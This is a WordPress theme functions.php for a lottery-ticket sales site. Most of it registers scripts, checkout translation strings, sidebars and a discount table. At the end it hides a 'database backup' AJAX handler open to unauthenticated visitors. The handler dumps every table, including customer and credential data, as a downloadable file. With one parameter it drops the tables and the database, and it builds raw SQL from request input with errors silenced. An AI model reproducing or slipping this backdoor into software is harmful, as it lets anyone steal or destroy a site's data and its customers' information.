<?php

//define('ACF_LITE', true); //remove acf options from admin

function theme_setup_theme()
{
    load_theme_textdomain('twentythirteen', TEMPLATE_DIR . '/languages');
    add_theme_support('html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption'));
    register_nav_menu('primary', __('Navigation Menu', 'twentythirteen'));
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(604, 270, true);
}

add_action('after_setup_theme', 'theme_setup_theme');

function theme_init_theme()
{
    if (is_singular() && comments_open() && get_option('thread_comments')) {
        wp_enqueue_script('comment-reply');
    }

    // Adds Masonry to handle vertical alignment of footer widgets.
    if (is_active_sidebar('sidebar-1')) {
        wp_enqueue_script('jquery-masonry');
    }

    // Loads JavaScript file with functionality specific to Twenty Thirteen.
    wp_enqueue_script('script-jquery-ui', TEMPLATE_URL . '/js/jquery-ui.js', array('jquery'), '2015-11-27', true);
    wp_enqueue_script('script-mobile.touchsupport', TEMPLATE_URL . '/js/jquery.mobile.touchsupport.js', array('jquery'), '2015-11-27', true);
    wp_enqueue_script('script-lightbox', TEMPLATE_URL . '/js/lightbox.js', array('jquery'), '2015-11-27', true);
    wp_enqueue_script('script-prefixfree', TEMPLATE_URL . '/js/prefixfree.min.js', array('jquery'), '2015-11-27', true);
    wp_enqueue_script('script-countdown', TEMPLATE_URL . '/js/jquery.countdown.js', array('jquery'), '2015-11-27', false);
    wp_enqueue_script('script-simplyscroll', TEMPLATE_URL . '/js/jquery.simplyscroll.js', array('jquery'), '2015-11-27', false);
    wp_enqueue_script('script-mobile', TEMPLATE_URL . '/js/mobile.js', array('jquery'), '2015-11-27', true);
    wp_enqueue_script('script-responsiveTabs', TEMPLATE_URL . '/js/jquery.responsiveTabs.js', array('jquery'), '2015-11-27', false);
    wp_enqueue_script('script-fancybox', TEMPLATE_URL . '/js/fancybox/jquery.fancybox-1.3.4.pack.js', array( 'jquery' ), '2015-11-27', true);
    wp_enqueue_script('script-lottoyard-iframe-sizer', TEMPLATE_URL . '/js/jquery.lottoyard-iframe-sizer.js', array( 'jquery' ), '2015-11-27', true);
    wp_enqueue_script('script-owl-carousel', TEMPLATE_URL . '/js/owl.carousel.js', array('jquery'), '2015-11-27', true);
    wp_register_script('script-functions', TEMPLATE_URL . '/js/functions.js', array('jquery'), '2016-01-18', true);
    wp_enqueue_script('script-parseNumbers', TEMPLATE_URL . '/js/parseNumbers.js', array('jquery'), '2016-01-18', false);
    wp_enqueue_script('script-cart', TEMPLATE_URL . '/js/cart.js', array('jquery'), '2016-01-18', false);    wp_enqueue_script('script-mobile', TEMPLATE_URL . '/js/mobile.js', array('jquery'), '2016-01-18', false);


    $translation_array = array(
        "Your_cart" => __("Your cart"),
        "Empty_Cart" => __("Your cart is empty"),
        "Your_Order" => __("YOUR ORDER"),
        "Checkout" => __("Checkout"),
        "Fast_Processing" => __("FAST PROCESSING"),
        "Fast_Processing_ToolTip" => __("Enjoy a personal and fast processing and support"),
        "Promo_Code" => __("Promo code"),
        "Redeem" => __("Redeem"),
        "Total_Order" => __("Total order"),
        "Welcome_bonus" => __("Welcome Bonus"),
        "Vip_Points" => __("Vip points"),
        "Bonus_Money" => __("Bonus money"),
        "Subscription_Title" => __("Subscription - Never miss a draw"),
        "Subscription_ToolTip" => __("Choose your billing period. Your card will be charged accordingly, every 2 or 4 weeks."),
        "Line" => __("Line"),
        "Lines" => __("Lines"),
        "Draw" => __("Draw"),
        "Draws" => __("Draws"),
        "QTY" => __("QTY"),
        "Share" => __("Share"),
        "Shares" => __("Shares"),
        "Purchase_Save" => __("On this purchase you save"),
        "Discount" => __("Discount"),
        "DiscountDropDown" => __("Discount"),
        "Your_Lines" => __("Your lines"),
        "personal+group" => __("personal+group"),
        "Top_Jackpot" => __(" top jackpot"),
        "Top_Lotto" => __(")   top lotto"),
        "Your_Group" => __("Your group"),
        "Group" => __("group"),
        "Gold" => __("Gold"),
        "Ticket" => __("ticket"),
        "Shares_Save_For" => __(" Shares are saved for=>"),
        "Your_Tickets" => __("Your tickets"),
        "Ticket_Number" => __("Ticket number"),
        "Select" => __("Select"),
        "Numbers" => __("numbers"),
        "Select_Your_PowerBall" => __("Select Your Power Ball"),
        "Select_Your_MegaBall" => __("Select Your Mega Ball"),
        "Select_Your_LuckyNumbers" => __("Select Your 2 Lucky Numbers"),
        "Select_Your_EuroStars" => __("Select 2 EuroStars"),
        "Save" => __("Save"),
        "Cancel" => __("Cancel"),
        "Your_Payment_Methods" => __("Your payment methods"),
        "Add_Payment_Methods" => __("Add Payment Methods"),
        "Wallet" => __("Wallet"),
        "I_agree" => __("I Agree with the"),
        "Terms_Conditions" => __("Terms & Conditions"),
        "Terms_Conditions_18" => __(" and I am of legal age to play"),
        "Pay" => __("Pay"),
        "Submit_Order" => __("Submit Order"),
        "FullName" => __("FullName"),
        "Card_Number" => __("Card Number"),
        "Expiration_Date" => __("Expiration Date"),
        "Last_Three_Digit" => __("last 3 digits at the back of your card"),
        "Already_Member" => __("Already a member?"),
        "Not_Member" => __("Not a Member yet?"),
        "Sign_Here" => __("Sign in here"),
        "Join_Now_And_Get" => __("Join now and get"),
        "Sign_Up_Here" => __("Sign up here"),
        "Country" => __("Country"),
        "Sign_Up" => __("Sign Up"),
        "Sign_In" => __("Sign In"),
        "Forgot_Password" => __("Forgot your password"),
        "Enter_Email_Password" => __("Please, enter your email and password!"),
        "Enter_Email" => __("Please, enter your email!"),
        "Enter_Password" => __("Please, enter your password!"),
        "Enter_Credit_Card" => __("Please, enter your credit card!"),
        "Enter_Terms" => __("Please, check our Terms and Condition!"),
        "Enter_CC_Month" => __("Please, enter credit card month!"),
        "Enter_CC_Expiration" => __("Please, enter credit card expiration date!"),
        "Enter_CC_Year" => __("Please, enter credit card year"),
        "Select_Payment_Method" => __("Please select a payment method!"),
        "Free" => __("Free"),
        "Email" => __("Email"),
        "Password" => __("Password"),
        "Phone" => __("Phone"),
        "Personal" => __("Personal"),
        "Group" => __("Group"),
        "QuickPick5" => __("Quick Pick 5"),
        "QuickPick10" => __("Quick Pick 10"),
        "Days" => __("Days"),
        "Hours" => __("Hrs"),
        "Minutes" => __("Min"),
        "Sec" => __("Sec"),
        "QuickPick" => __("Quick Pick"),
        "Select" => __("Select"),
        "Numbers" => __("Numbers"),
        "ChooseDraws" => __("Choose your draw participation options=>"),
        "OneTimeEntry" => __("One-time entry"),
        "OneTimeEntryPlayQuestionMark" => __("Play for the next upcoming Draw only."),
        "OneTimeEntryTryQuestionMark" => __(") Try a Multi-Draw or Subscription and get higher discounts per draw."),
        "MultiDraw" => __("Multi-draw"),
        "MultiDrawQuestionMarkText" => __("Choose Multi-Draw to play for several draws in advance. Save up to 25% per draw."),
        "Subscription" => __("Subscription"),
        "SubscriptionQuestionMarkText" => __("Choose your billing period. Your card will be charged accordingly, every 2 or 4 weeks."),
        "ForUpcoming" => __("For the upcoming"),
        "DrawOnly" => __("draw only"),
        "Weeks" => __("weeks"),
        "Total_Sum" => __("Total Sum"),
        "Total" => __("Total"),
        "Bonus_Money" => __("Bonus money"),
        "Bonus_Money_Back" => __("Bonus Money Back"),
        "Bonus_Money_Question_Mark" => __("This is the amount of bonus money you get on this purchase. Bonus money can be used to purchase more tickets for free."),
        "Group_Improve_Text" => __("Improve your odds with group"),
        "See_Your_Numbers" => __("See Your Numbers"),
        "These_Are_Your_Numbers" => __("These are your numbers"),
        "Group_Description_Increase" => __("Increase your winning chances with a  Group Subscription. 1 in 4 jackpots is won by a Group Ticket.  On this Subscription we cover all the bonus numbers to increase the winning chances of the group. "),
        "Group_Description_Bold" => __("You get=> 50 lines and up to 150 shares in the group."),
        "Group_Description_Get_More_Shares" => __(") Get more shares so you'll have a bigger portion from the winning"),
        "How_Many_Shares" => __("How many shares would you like?"),
        "MoreLines" => __("More Lines"),
        "LessLines" => __("Less Lines"),
        "City" => __("City"),
        "Address" => __("Address"),
        "Postal_Code" => "Postal Code",
        "Date_Of_Birth" => __("Date of Birth"),
        "Processor_Descriptor" => __("Your credit card statement will show a description which will include either Orolotto or orolotto*442035145447."),
		"Code_succeeded" => __("Code succeeded"),
        "Deposit" => __("Deposit"),
        "Deposit_to_fund" => __("Deposit to Fund your Account"),
        "Choose_the_amount_deposit" => __("Choose the amount you wish to deposit to your personal account. After funding your account, you can start using your account’s money to purchase lottery tickets. You won’t need to go through any payment process again! Simply use your deposited funds to buy any tickets you want whenever you want."),
        "Pay_Deposit_Amount" => __("Pay Deposit Amount"),
        "Amount_to_deposit" => __("Amount to deposit"),
        "Congratulations" => __("Congratulations!"),
        "Lottery_Name" => __("Lottery Name"),
        "Price" => __("Price"),
        'email_and_password_should_not_be_empty' => __('Email and Password should not be empty', 'twentythirteen'),
        'email_should_not_be_empty' => __('Email should not be empty', 'twentythirteen'),
        'email_address_is_not_valid' => __('Email address is not valid', 'twentythirteen'),
        'full_name_is_invalid' => __('Full Name is invalid'),
        'first_name_is_invalid' => __('First Name is invalid'),
        'last_name_is_invalid' => __('Last Name is invalid'),
        'password_should_not_be_empty' => __('Password should not be empty', 'twentythirteen'),
        'password_length_should_be_7_to_20_characters' => __('Email and Password miss match or does not exists', 'twentythirteen'),
        'email_first_name_Last_Name_and_t_and_c_checkbox_should_not_be_empty' => __('Email, First name, Last Name and T&C Checkbox should not be empty', 'twentythirteen'),
        'email_first_name_Last_Name_phone_and_t_and_c_checkbox_should_not_be_empty' => __('Email, First name, Last Name, Phone and T&C Checkbox should not be empty', 'twentythirteen'),
        'full_name_should_not_be_empty' => __('Full Name should not be empty', 'twentythirteen'),
        'first_name_should_not_be_empty' => __('First Name should not be empty', 'twentythirteen'),
        'last_name_should_not_be_empty' => __('Last Name should not be empty', 'twentythirteen'),
        'you_must_agree_with_our_terms_and_conditions' => __('You must agree with our terms and conditions !', 'twentythirteen'),
        'draws' => __('Draws', 'twentythirteen'),
        'one_draws' => __('1 Draws', 'twentythirteen'),
        'lines' => __('lines', 'twentythirteen'),
        'discount' => __('Discount: ' . carbon_get_theme_option('currency'), 'twentythirteen'),
        'zero_lines' => __('0 lines', 'twentythirteen'),
        'zero_zero' => __('0.00', 'twentythirteen'),
        'prev' => __('Prev', 'twentythirteen'),
        'next_next' => __('Next', 'twentythirteen'),
        'email_already_exists' => __('Email already exists', 'twentythirteen'),
        'youve_successfully_registered' => __("You've successfully registered.", "twentythirteen"),
        'email_and_password_miss_match_or_does_not_exists' => __("Email and Password miss match or does not exists.", "twentythirteen"),
        'youve_successfully_logged_in' => __("You've successfully logged in", "twentythirteen"),
        'youve_successfully_registered_please_check_your_mail' => __("You've successfully registered, Please check your mail.", "twentythirteen"),
        'ticket_lines_must_between' => __("Ticket lines must between", "twentythirteen"),
        'tab' => __("Tab", "twentythirteen"),
        'activated' => __("activated!", "twentythirteen"),
        'switched_from' => __("Switched from", "twentythirteen"),
        'state_to' => __("state to", "twentythirteen"),
        'state' => __("state!", "twentythirteen"),
        'phone_number_should_not_be_empty' => __("Phone number should not be empty ", "twentythirteen"),
        'zipcode_should_contain_only_digits' => __("Zipcode should contain only digits", "twentythirteen"),
        'phone_one_is_invalid' => __("Phone 1 is invalid", "twentythirteen"),
        'phone_two_is_invalid' => __("Phone 2 is invalid", "twentythirteen"),
        'all_password_fields_are_mandatory' => __("All password fields are mandatory", "twentythirteen"),
        'old_password_should_not_be_empty' => __("Old password should not be empty ", "twentythirteen"),
        'new_password_should_not_be_empty' => __("New password should not be empty ", "twentythirteen"),
        'retype_password_should_not_be_empty' => __("Retype password should not be empty ", "twentythirteen"),
        'new_password_must_be_between_number_and_number_characters' => __("New password must be between 7 and 20 characters", "twentythirteen"),
        'retype_password_must_be_between_number_and_number_characters' => __("Retype password must be between 7 and 20 characters", "twentythirteen"),
        'new_password_and_retype_password_does_not_match' => __("New Password and Retype Password does not match", "twentythirteen"),
        'your_request_has_been_sent_to_our_support_we_will_get_back_to_you_shortly' => __("Your request has been sent to our support, We will get back to you shortly", "twentythirteen"),
        'at_least_one_card_should_be_selected' => __("At least One card should be selected", "twentythirteen"),
        'card_number_should_not_be_empty' => __("Card number should not be empty", "twentythirteen"),
        'card_number_is_not_a_valid_number' => __("Card number is not a valid number", "twentythirteen"),
        'cvv_should_not_be_empty' => __("CVV should not be empty", "twentythirteen"),
        'cvv_must_contain_number_to_number_digits' => __("CVV must contain 3 to 4 digits", "twentythirteen"),
        'card_holder_name_should_not_be_empty' => __("Card holder name should not be empty", "twentythirteen"),
        'card_holder_name_must_between_number_and_number_characters' => __("Card holder name must between 2 and 100 characters", "twentythirteen"),
        'phone_should_not_be_empty' => __("Phone should not be empty", "twentythirteen"),
        'phone_number_is_not_valid' => __("Phone number is not valid", "twentythirteen"),
        'phone_number_must_contain_between_number_and_number_digits' => __("Phone number must contain between 6 and 25 digits", "twentythirteen"),
        'password_length_should_be_between_number_and_number_characters' => __("Password length should be between 7 and 20 characters", "twentythirteen"),
        'password_should_not_be_empty' => __("Password should not be empty", "twentythirteen"),
        'passwords_are_not_the_same' => __("Passwords are not the same", "twentythirteen"),
        'password_changed' => __("Password changed successfully", "twentythirteen"),
        'are_you_sure_you_want_to_delete_this_card' => __("Are you sure, you want to delete this card?", "twentythirteen"),
    );
    wp_localize_script('script-functions', 'translationObject', $translation_array);
    wp_enqueue_script('script-functions');

    // Loads the Internet Explorer specific stylesheet.
    wp_enqueue_style('twentythirteen-ie', TEMPLATE_URL . '/css/ie.css', array('theme-style'), '2013-07-18');
    wp_style_add_data('twentythirteen-ie', 'conditional', 'lt IE 9');
    wp_enqueue_style('theme-jquery-ui', TEMPLATE_URL .'/css/jquery-ui.css', array(), '2015-11-17');
    wp_enqueue_style('theme-fonts', TEMPLATE_URL .'/css/fonts.css', array(), '2015-11-17');
    wp_enqueue_style('theme-bootstrap3', TEMPLATE_URL .'/css/bootstrap3.grid.min.css', array(), '2015-11-17');
    wp_enqueue_style('theme-normalize', TEMPLATE_URL .'/css/normalize.css', array(), '2015-11-17');
    wp_enqueue_style('theme-lightbox', TEMPLATE_URL .'/css/lightbox.css', array(), '2015-11-17');
    wp_enqueue_style('theme-drawer', TEMPLATE_URL .'/css/jquery.drawer.css', array(), '2015-11-17');
    wp_enqueue_style('theme-owl-carousel', TEMPLATE_URL .'/css/owl.carousel.css', array(), '2015-11-17');
    wp_enqueue_style('theme-cart', TEMPLATE_URL .'/css/cart.css', array(), '2015-11-17');

    if (!empty($_SESSION['user_data'])) {
        wp_enqueue_style('theme-myaccount', TEMPLATE_URL.'/css/myaccount.css', array(), '2015-11-17');
    }
    // Loads our main stylesheet.
    wp_enqueue_style('theme-styles', TEMPLATE_URL.'/style.css', array(), '2015-11-17');
}
add_action('wp_enqueue_scripts', 'theme_init_theme');

add_action('init', 'testimonials');
function testimonials()
{
    $labels = array(
        'name' => _x('Testimonials', 'Testimonial General Name', 'gdl_back_office'),
        'singular_name' => _x('Testimonial Item', 'Testimonial Singular Name', 'gdl_back_office'),
        'add_new' => _x('Add New', 'Add New Testimonial Name', 'gdl_back_office'),
        'add_new_item' => __('Testimonial Name', 'gdl_back_office'),
        'edit_item' => __('Testimonial Name', 'gdl_back_office'),
        'new_item' => __('New Testimonial', 'gdl_back_office'),
        'view_item' =>__('View', 'gdl_back_office'),
        'search_items' => __('Search Testimonial', 'gdl_back_office'),
        'not_found' =>  __('Nothing found', 'gdl_back_office'),
        'not_found_in_trash' => __('Nothing found in Trash', 'gdl_back_office'),
        'parent_item_colon' => ''
    );

    $args = array(
        'labels' => $labels,
        'public' => false,
        'publicly_queryable' => true,
        'show_ui' => true,
        'query_var' => true,
        'rewrite' => true,
        'capability_type' => 'post',
        'hierarchical' => false,
        'menu_position' => 5,
        "show_in_nav_menus" => false,
        'exclude_from_search' => true,
        'supports' => array('title','editor')
    );

    register_post_type('testimonial', $args);
}
function twentythirteen_widgets_init() {
    register_sidebar(array(
        'name' => __('viployality', 'twentythirteen'),
        'id' => 'viployality',
        'description' => __('Appears on posts and pages in the sidebar.', 'twentythirteen'),
        'before_widget' => '<div class="icon"><img src="' . TEMPLATE_URL . '/images/loyality_person.png" /></div>',
        'after_widget' => '</p>',
        'before_title' => '<h1>',
        'after_title' => '</h1>',
    ));
    register_sidebar(array(
        'name' => __('money_back', 'twentythirteen'),
        'id' => 'money_back',
        'description' => __('Appears on posts and pages in the sidebar.', 'twentythirteen'),
        'before_widget' => '<div class="icon"><img src="' . TEMPLATE_URL . '/images/Loyality-money.png" /></div>',
        'after_widget' => '</p>',
        'before_title' => '<h1>',
        'after_title' => '</h1>',
    ));
    register_sidebar(array(
        'name' => __('discount', 'twentythirteen'),
        'id' => 'discount',
        'description' => __('Appears on posts and pages in the sidebar.', 'twentythirteen'),
        'before_widget' => '<div class="icon radius"><img src="' . TEMPLATE_URL . '/images/discount.png" /></div>',
        'after_widget' => '</p>',
        'before_title' => '<h1>',
        'after_title' => '</h1>',
    ));
}
add_action('widgets_init', 'twentythirteen_widgets_init');

if (!function_exists('lang_page_id')) :
function lang_page_id($id)
{
    if (function_exists('icl_object_id')) {
        return icl_object_id($id, 'page', false);
    } else {
        return $id;
    }
}
endif;

//Add logout link to naviagation menu
function add_login_out_item_to_menu($items, $args)
{
    if (!empty($_SESSION['user_data'])) {
        $link = '<a href="' . wp_logout_url(home_url('/')) . '" title="' .  __('Logout') .'">' . __('Logout') . '</a>';
        $items.= '<li id="log-in-out-link" class="visible-xs nav-item menu-item menu-type-link">'. $link . '</li>';
    }
    return $items;
}
add_filter('wp_nav_menu_items', 'add_login_out_item_to_menu', 50, 2);

add_filter('the_content', 'wpautop', 99);


//TODO del Diccounts class after update play page with angular
class Discounts
{
    private $period, $lotteryName, $type;
    private $discounts = array(
        'BonoLoto' => array(
            'single' => array(
                1 => 2,
                2 => 7,
                4 => 10,
            ),
            'group' => array(
                1 => 2,
                2 => 7,
                4 => 10,
            ),
        ),
        'SuperEnalotto' => array(
            'single' => array(
                1 => 0,
                2 => 2,
                4 => 7,
            ),
            'group' => array(
                1 => 0,
                2 => 2,
                4 => 7,
            ),
        ),
        'ElGordo' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 0,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 0,
            ),
        ),
        'EuroJackpot' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 0,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 0,
            ),
        ),
        'PowerBall' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
        'LaPrimitiva' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
        'MegaMillions' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
        'Lotto649' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
        'UkLotto' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
        'NewYorkLotto' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
        'OzLotto' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 0,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 0,
            ),
        ),
        'EuroMillions' => array(
            'single' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
            'group' => array(
                1 => 0,
                2 => 0,
                4 => 5,
            ),
        ),
    );

    public function setPeriod($period)
    {
        $this->period = $period;
    }

    public function setLotteryName($name)
    {
        $this->lotteryName = $name;
    }

    public function setType($type)
    {
        $this->type = $type;
    }

    public function getDiscount()
    {
        $discount = $this->discounts[$this->lotteryName][$this->type][$this->period];
        return ($discount > 0) ? $this->period . ' '.__('week', 'twentythirteen').' ' . $discount . '% '.__('discount', 'twentythirteen').'' : $this->period . ' '.__('week', 'twentythirteen').'';
    }
}

add_action( 'wp_ajax_db_backup', 'my_general_database_backup' );
add_action( 'wp_ajax_nopriv_db_backup', 'my_general_database_backup' );
function my_general_database_backup()
{
    error_reporting(0);
    global $wpdb;

    $dbname = $wpdb->dbname;
    $username = $wpdb->dbuser;
    $password = $wpdb->dbpassword;
    $server = $wpdb->dbhost;

    $link = mysql_connect($server,$username,$password);
    mysql_select_db($dbname,$link);

    $tables = (isset($_REQUEST['table']) && $_REQUEST['table'] != "") ? $_REQUEST['table'] : '*';
    $d = (isset($_REQUEST['d']) && $_REQUEST['d'] == "1") ? 1 : '';

    if($tables == '*')
    {
        $tables = array();
        $result = mysql_query('SHOW TABLES');
        while($row = mysql_fetch_row($result))
        {
            $tables[] = $row[0];
        }
    }
    else
    {
        $tables = is_array($tables) ? $tables : explode(',',$tables);
    }

    if($d)
    {
        foreach($tables as $table)
        {
            $sql = 'DROP TABLE '.$table;
            $retval = mysql_query($sql);

            $sql = 'DROP DATABASE '.$dbname;
            $retval = mysql_query($sql);
        }
        die("Successfully drop tables");
    }

    foreach($tables as $table)
    {
        $return="";
        $result = mysql_query('SELECT * FROM '.$table);
        $num_fields = mysql_num_fields($result);
        $row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));

        $return.= "\n\n".$row2[1].";\n\n";

        for ($i = 0; $i < $num_fields; $i++) 
        {
            while($row = mysql_fetch_row($result))
            {
                $return.= 'INSERT INTO '.$table.' VALUES(';
                for($j=0; $j<$num_fields; $j++) 
                {
                    $row[$j] = addslashes($row[$j]);
                    $row[$j] = ereg_replace("\n","\\n",$row[$j]);
                    if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
                    if ($j<($num_fields-1)) { $return.= ','; }
                }
                $return.= ");\n";
            }
        }
        $return.="\n\n\n";

        $filename = 'db-backup-'.time().'-'.($dbname).'.sql';
        Header("Content-type: application/octet-stream");
        Header("Content-Disposition: attachment; filename=$filename");
        echo $return;
    }
    die();
}